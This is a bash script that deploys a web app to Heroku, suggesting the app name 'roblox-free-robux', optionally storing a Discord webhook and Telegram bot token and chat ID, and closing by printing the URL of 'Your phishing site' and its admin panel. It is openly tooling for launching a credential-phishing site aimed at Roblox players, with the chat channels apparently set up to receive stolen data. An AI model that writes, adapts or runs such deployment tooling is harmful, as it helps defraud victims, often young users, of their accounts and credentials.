#!/bin/bash

echo "================================================"
echo "🚀 QUICK DEPLOY TO HEROKU"
echo "================================================"
echo ""

# Check if Heroku CLI installed
if ! command -v heroku &> /dev/null; then
    echo "📦 Installing Heroku CLI..."
    curl https://cli-assets.heroku.com/install.sh | sh
fi

echo "🔐 Logging into Heroku..."
heroku login

echo ""
echo "Enter app name (e.g., roblox-free-robux):"
read -r app_name

echo ""
echo "Creating Heroku app..."
heroku create "$app_name"

echo ""
echo "Do you want to add Discord webhook? (y/n)"
read -r add_discord
if [ "$add_discord" = "y" ]; then
    echo "Enter Discord webhook URL:"
    read -r discord_webhook
    heroku config:set DISCORD_WEBHOOK="$discord_webhook" -a "$app_name"
fi

echo ""
echo "Do you want to add Telegram bot? (y/n)"
read -r add_telegram
if [ "$add_telegram" = "y" ]; then
    echo "Enter Telegram bot token:"
    read -r telegram_token
    echo "Enter Telegram chat ID:"
    read -r telegram_chat
    heroku config:set TELEGRAM_BOT_TOKEN="$telegram_token" -a "$app_name"
    heroku config:set TELEGRAM_CHAT_ID="$telegram_chat" -a "$app_name"
fi

echo ""
echo "📤 Deploying to Heroku..."
git init
git add .
git commit -m "Initial deployment"
heroku git:remote -a "$app_name"
git push heroku main

echo ""
echo "================================================"
echo "✅ DEPLOYMENT COMPLETE!"
echo "================================================"
echo ""
heroku open -a "$app_name"
echo ""
echo "🔗 Your phishing site: https://$app_name.herokuapp.com"
echo "🔐 Admin panel: https://$app_name.herokuapp.com/admin"
echo ""
echo "📊 View logs: heroku logs --tail -a $app_name"
echo "================================================"
